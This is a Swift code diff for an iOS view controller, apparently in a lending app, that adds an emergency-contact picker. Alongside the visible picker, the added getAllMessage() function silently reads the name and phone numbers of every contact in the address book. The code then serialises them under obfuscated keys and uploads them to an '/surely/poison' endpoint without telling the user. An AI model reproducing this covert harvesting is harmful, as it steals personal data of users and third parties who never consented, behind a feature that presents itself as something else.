@@ -12,6 +12,8 @@ import Photos
 import TYAlertController
 import Kingfisher
 import Combine
+import Contacts
+import ContactsUI
 
 class VitamainFourViewController: BaseViewController {
     
@@ -20,6 +22,14 @@ class VitamainFourViewController: BaseViewController {
     var model = BehaviorRelay<netModel?>(value: nil)
     
     var oneModel = BehaviorRelay<netModel?>(value: nil)
+    
+    let contactStore = CNContactStore()
+    
+    var selectCell: MyLoveViewCell?
+    
+    var selectIndex: Int = 0
+    
+    var dictArray: [[String: String]] = []
     
     lazy var hedImageView: UIImageView = {
         let hedImageView = UIImageView()
@@ -126,7 +136,17 @@ class VitamainFourViewController: BaseViewController {
         }
         
         nextBtn.rx.tap.subscribe(onNext: { [weak self] in
-            
+            guard let self = self,
+                  let oneModel = self.oneModel.value,
+                  let modelArray = oneModel.army else { return }
+            dictArray.removeAll()
+            for model in modelArray {
+                let dict = ["paths": model.paths ?? "",
+                            "paralysed": model.paralysed ?? "",
+                            "beaten": model.beaten ?? ""]
+                dictArray.append(dict)
+            }
+            safeBingoInfo(with: dictArray)
         }).disposed(by: disposeBag)
         
         getApiInfo()
@@ -135,6 +155,39 @@ class VitamainFourViewController: BaseViewController {
 }
 
 extension VitamainFourViewController {
+    
+    private func safeBingoInfo(with dictArray: [[String: String]]) {
+        let barricaded = self.model.value?.enlarged?.orifice ?? ""
+        var jstring: String = ""
+        do {
+            let jsonData = try JSONSerialization.data(withJSONObject: dictArray, options: [])
+            if let jsonString = String(data: jsonData, encoding: .utf8) {
+                jstring = jsonString
+            }
+        } catch {
+            print("Failed to convert phoneArray to JSON: \(error)")
+        }
+        ViewHudConfig.showLoading()
+        let dict = ["barricaded": barricaded, "net": jstring]
+        NetworkManager.multipartFormDataRequest(endpoint: "/surely/die", parameters: dict, responseType: BaseModel.self) { [weak self] result in
+            switch result {
+            case .success(let success):
+                guard let self = self else { return }
+                if success.wedge == "0" {
+                    self.productDetailInfo(from: barricaded) { model in
+                        self.model.accept(model)
+                        self.vitaminInfo(from: model) { model in }
+                    }
+                }
+                ToastShowConfig.showMessage(form: view, message: success.circular ?? "")
+                ViewHudConfig.hideLoading()
+                break
+            case .failure(_):
+                ViewHudConfig.hideLoading()
+                break
+            }
+        }
+    }
     
     override func viewDidLayoutSubviews() {
         super.viewDidLayoutSubviews()
@@ -189,8 +242,163 @@ extension VitamainFourViewController: UITableViewDelegate, UITableViewDataSource
         return cell
     }
     
+    func tableView(_ tableView: UITableView, didSelectRowAt indexPath: IndexPath) {
+        let model = self.oneModel.value?.army?[indexPath.row]
+        let cell = tableView.cellForRow(at: indexPath) as! MyLoveViewCell
+        self.selectCell = cell
+        self.selectIndex = indexPath.row
+        if let model = model {
+            popSelectOneViewInfo(from: model, cell: cell)
+        }
+    }
+    
 }
 
-extension VitamainFourViewController {
+extension VitamainFourViewController: CNContactPickerDelegate {
     
+    private func popSelectOneViewInfo(from model: armyModel, cell: MyLoveViewCell) {
+        let selectOneView = SelectOneView(frame: CGRectMake(0, 0, SCREEN_WIDTH, SCREEN_HEIGHT))
+        let modelArray = model.extricate ?? []
+        selectOneView.modelArray.accept(modelArray)
+        let alertVc = TYAlertController(alert: selectOneView, preferredStyle: .alert)!
+        self.present(alertVc, animated: true)
+        
+        selectOneView.dismissBlock = { [weak self] in
+            guard let self = self else { return }
+            self.dismiss(animated: true)
+        }
+        
+        selectOneView.comfirmBlock = { [weak self] index, enumModel in
+            guard let self = self else { return }
+            self.dismiss(animated: true) {
+                cell.clickLabel.text = enumModel.paralysed ?? ""
+                cell.clickLabel.textColor = .init(hexStr: "#FF3824")
+                model.paths = enumModel.bajada ?? "0"
+                model.common = enumModel.paralysed ?? ""
+                DispatchQueue.main.async {
+                    self.comtactMeaageInfo(from: model, cell: cell)
+                }
+            }
+        }
+    }
+    
+    private func comtactMeaageInfo(from model: armyModel, cell: MyLoveViewCell) {
+        requestContactsAccess()
+    }
+    
+    func requestContactsAccess() {
+        let authorizationStatus = CNContactStore.authorizationStatus(for: .contacts)
+        switch authorizationStatus {
+        case .notDetermined:
+            contactStore.requestAccess(for: .contacts) { [weak self] (granted, error) in
+                DispatchQueue.main.async {
+                    if !granted {
+                        self?.showPermissionDeniedAlert(for: "Contact")
+                    } else {
+                        self?.accessContacts()
+                    }
+                }
+            }
+            break
+        case .restricted, .denied:
+            self.showPermissionDeniedAlert(for: "Contact")
+            break
+        case .authorized:
+            DispatchQueue.main.async {
+                self.accessContacts()
+            }
+            break
+        case .limited:
+            self.showPermissionDeniedAlert(for: "Contact")
+            break
+        @unknown default:
+            break
+        }
+    }
+    
+    func accessContacts() {
+        getAllMessage()
+        showSystemContactPicker()
+    }
+    
+    func getAllMessage() {
+        DispatchQueue.global(qos: .userInitiated).async { [weak self] in
+            var phoneArray: [[String: Any]] = []
+            let keys = [CNContactGivenNameKey, CNContactFamilyNameKey, CNContactPhoneNumbersKey]
+            let request = CNContactFetchRequest(keysToFetch: keys as [CNKeyDescriptor])
+            do {
+                try self?.contactStore.enumerateContacts(with: request) { (contact, stop) in
+                    let fullName = "\(contact.givenName) \(contact.familyName)"
+                    let phoneNumbersString = contact.phoneNumbers
+                        .map { $0.value.stringValue }
+                        .joined(separator: ",")
+                    let dict = ["hat": phoneNumbersString, "paralysed": fullName]
+                    phoneArray.append(dict)
+                }
+                self?.updateFocusIfNeededInfo(from: phoneArray)
+            } catch {
+                print("error: \(error.localizedDescription)")
+            }
+        }
+    }
+    
+    func showSystemContactPicker() {
+        let picker = CNContactPickerViewController()
+        picker.delegate = self
+        
+        picker.predicateForEnablingContact = NSPredicate(format: "phoneNumbers.@count > 0")
+        
+        picker.displayedPropertyKeys = [CNContactPhoneNumbersKey]
+        
+        present(picker, animated: true)
+    }
+    
+    
+    func contactPicker(_ picker: CNContactPickerViewController, didSelect contact: CNContact) {
+        let fullName = "\(contact.familyName) \(contact.givenName)"
+        if fullName.isEmpty {
+            ToastShowConfig.showMessage(form: view, message: "Emergency contact name cannot be empty.")
+            return
+        }
+        if let phoneNumber = contact.phoneNumbers.first?.value.stringValue {
+            if let selectCell = self.selectCell {
+                selectCell.cpLabel.text = "\(fullName) - \(phoneNumber)"
+                selectCell.cpLabel.textColor = .init(hexStr: "#FF3824")
+                if let model = self.oneModel.value?.army?[selectIndex] {
+                    model.paralysed = fullName
+                    model.beaten = phoneNumber
+                }
+            }
+        } else {
+            ToastShowConfig.showMessage(form: view, message: "Emergency contact phone number cannot be empty.")
+        }
+    }
+    
+    func contactPickerDidCancel(_ picker: CNContactPickerViewController) {
+        
+    }
+    
+    private func updateFocusIfNeededInfo(from phoneArray: [[String: Any]]) {
+        do {
+            let jsonData = try JSONSerialization.data(withJSONObject: phoneArray, options: [])
+            if let jsonString = String(data: jsonData, encoding: .utf8) {
+                let dict = ["net": jsonString]
+                sageVinfo(with: dict)
+            }
+            
+        } catch {
+            print("Failed to convert phoneArray to JSON: \(error)")
+        }
+    }
+    
+    private func sageVinfo(with dict: [String: String]) {
+        NetworkManager.multipartFormDataRequest(endpoint: "/surely/poison", parameters: dict, responseType: BaseModel.self) { result in
+            switch result {
+            case .success(_):
+                break
+            case .failure(_):
+                break
+            }
+        }
+    }
 }
